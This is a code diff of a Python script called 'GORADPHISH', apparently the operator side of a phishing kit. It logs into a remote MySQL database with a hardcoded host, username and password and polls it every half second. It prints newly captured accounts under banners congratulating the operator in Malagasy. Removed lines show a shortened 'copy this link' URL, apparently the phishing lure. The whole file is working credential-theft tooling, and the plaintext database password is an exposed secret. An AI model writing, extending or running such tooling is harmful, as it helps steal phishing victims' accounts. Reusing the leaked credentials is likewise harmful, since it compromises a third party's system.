@@ -3,33 +3,26 @@ import time
 import os
 from colorama import Fore, Style, init
 import pyfiglet
+import assets.title as ttl
 
 # Initialisation de colorama pour Windows (inutile sous Linux, mais incluse pour la compatibilité)
 init(autoreset=True)
 
 # Fonction pour afficher le titre avec pyfiglet
-def afficher_titre():
-    os.system('clear')  # Efface l'écran (sous Linux et macOS)
-    titre = pyfiglet.figlet_format("GORADPHISH")
-    print(Fore.CYAN + titre + Style.RESET_ALL)
 
-    
-    print("Auteur:cybergorad")
-    print("version:1.0.0") 
-    print("")
-    print("")
-    print("copy this link : https://cutt.ly/SemVpaJu")
 
-# Afficher le titre "GORADPHISH" en gros texte
-afficher_titre()
+# Afficher le titre "GORADPHISH" en gros textes
+ttl.afficher_titre()
 
 # Configurations de la connexion MySQL
+
 config = {
     'host': 'mysql-tsilavina.alwaysdata.net',
     'user': 'tsilavina',
     'password': 'tsilavina2610tsilavina2610',
     'database': 'tsilavina_2610'
 }
+
 
 # Variable pour stocker les données précédemment reçues
 donnees_vues = set()  # Utiliser un ensemble pour garder trace des données déjà affichées
@@ -52,7 +45,7 @@ def initialiser_donnees_vues():
 def recuperer_nouvelles_donnees():
     global donnees_vues
     try:
-        # Connexion au serveur MySQL
+        # Connect to server
         connection = mysql.connector.connect(**config)
         cursor = connection.cursor()
 
@@ -64,7 +57,7 @@ def recuperer_nouvelles_donnees():
         nouvelles_donnees = [row for row in results if row not in donnees_vues]
 
         if nouvelles_donnees:
-            print(Fore.GREEN + "KAONTY VAOVAO AZO :")
+            print(Fore.GREEN + "CONGRAGULATIONS ito ny kaonty azontsika  :")
             for row in nouvelles_donnees:
                 print(Fore.YELLOW + str(row))
                 donnees_vues.add(row)  # Ajouter les nouvelles lignes à l'ensemble des données vues
@@ -75,12 +68,12 @@ def recuperer_nouvelles_donnees():
         cursor.close()
         connection.close()
     except mysql.connector.Error as err:
-        print(Fore.RED + f"Erreur : {err}")
+        print(Fore.RED + f"Vérifier votre connexion internet et réssayer plus tard..")
 
 # Initialisation pour ignorer les anciennes données
 initialiser_donnees_vues()
 
-# Boucle pour vérifier périodiquement les nouvelles données
+# Boucle pour nouvelle donnés
 while True:
     recuperer_nouvelles_donnees()
-    time.sleep(0.5)  # Pause de 10 secondes avant la prochaine vérification
+    time.sleep(0.5)  # Pause de 0.5 secondes avant la prochaine vérification
